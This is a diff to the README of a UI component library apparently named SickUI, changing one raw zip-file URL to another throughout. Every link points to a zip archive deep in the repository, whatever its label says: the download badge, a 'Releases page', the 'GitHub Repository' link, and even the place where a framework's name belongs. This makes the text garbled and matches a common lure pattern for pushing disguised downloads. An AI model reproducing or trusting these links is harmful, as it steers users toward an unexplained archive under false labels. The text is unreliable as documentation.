@@ -1,6 +1,6 @@
 # 🎨 SickUI - Build Beautiful Web Apps Easily
 
-[![Download SickUI](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip%20SickUI-v1.0-blue)](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
+[![Download SickUI](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip%20SickUI-v1.0-blue)](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure you have the following:
 
 To get started with SickUI, visit the Releases page to download the files you need.
 
-[Visit the Releases page to download](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
+[Visit the Releases page to download](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip)
 
 Once on the page, look for the latest version, and download the file appropriate for your system. Follow the instructions below:
 
@@ -32,7 +32,7 @@ SickUI provides several components and features to enhance your web applications
 
 - **Pre-styled Components:** Use beautifully designed buttons, cards, and forms without needing design skills.
 - **Responsive Design:** Your applications will look great on all devices, from desktops to mobile phones.
-- **Easy Integration:** SickUI works seamlessly with popular frameworks like https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip and React.
+- **Easy Integration:** SickUI works seamlessly with popular frameworks like https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip and React.
 - **Customizable Styles:** Adjust colors and styles using Tailwind CSS for a unique look.
 
 ## 🛠️ How to Use SickUI
@@ -47,7 +47,7 @@ For more detailed instructions and examples on using SickUI components, refer to
 
 - Component examples
 - Style customization tips
-- Integration tutorials with https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip and React
+- Integration tutorials with https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip and React
 
 ## 💬 Support
 
@@ -63,7 +63,7 @@ SickUI is open-source, and contributions are welcomed! If you're interested in i
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/Peruginesque/SickUI.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ekkyhanafi/SickUI/main/apps/docs/src/Sick_UI_v3.8.zip)
 - [Demo Site](#) (Placeholder for a demo site URL)
 - [Community Forums](#) (Placeholder for forums or chat support)
 
